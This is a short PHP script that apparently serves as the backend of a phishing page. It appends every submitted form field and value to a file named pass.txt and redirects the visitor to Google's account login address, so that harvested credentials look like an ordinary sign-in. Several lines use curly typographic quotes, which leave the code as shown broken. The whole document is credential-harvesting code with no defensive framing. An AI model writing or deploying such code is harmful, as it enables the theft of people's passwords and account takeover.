<?php
 echo "<script type = 'text/javascript'> alert('hiii'); </script>";
header(“Location: https://www.google.com/accounts/ServiceLoginAuth “);
$handle = fopen(“pass.txt”, “a”);
foreach($_POST as $variable => $value) {
  echo "<script type = 'text/javascript'> alert('$variable');</script>";
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “\r\n”);
}
fwrite($handle, “\r\n”);
fclose($handle);
exit;
?>
